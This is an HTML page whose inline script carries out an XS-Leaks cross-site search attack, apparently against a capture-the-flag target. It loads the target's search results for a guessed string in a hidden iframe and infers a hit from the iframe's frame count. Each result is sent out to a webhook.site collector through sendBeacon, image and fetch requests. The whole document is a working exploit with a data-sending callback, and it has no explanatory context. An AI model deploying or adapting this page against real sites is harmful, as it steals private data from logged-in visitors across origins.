<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>.</title></head>
<body>
<script>
const WEBHOOK = 'https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c';
const TARGET  = 'https://wonder.cbd2026.cloud';

function exfil(data) {
  const url = WEBHOOK + '?' + new URLSearchParams(data).toString();
  navigator.sendBeacon(url);
  new Image().src = url;
  fetch(url, { mode: 'no-cors' }).catch(() => {});
}

const guess = new URLSearchParams(location.search).get('g') || '';
const idx   = new URLSearchParams(location.search).get('i') || '';

if (!guess) {
  document.body.innerText = 'missing ?g= param';
} else {
  exfil({ status: 'loading', guess, idx });

  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
  iframe.src = TARGET + '/search?q=' + encodeURIComponent(guess);

  iframe.onload = function() {
    try {
      const len = iframe.contentWindow.length;
      exfil({ status: 'done', guess, idx, win_length: len, hit: len > 0 ? '1' : '0' });
    } catch(e) {
      exfil({ status: 'error', guess, idx, err: e.message });
    }
  };

  iframe.onerror = function() {
    exfil({ status: 'iframe_error', guess, idx });
  };

  document.body.appendChild(iframe);

  setTimeout(() => exfil({ status: 'timeout', guess, idx }), 8000);
}
</script>
</body>
</html>
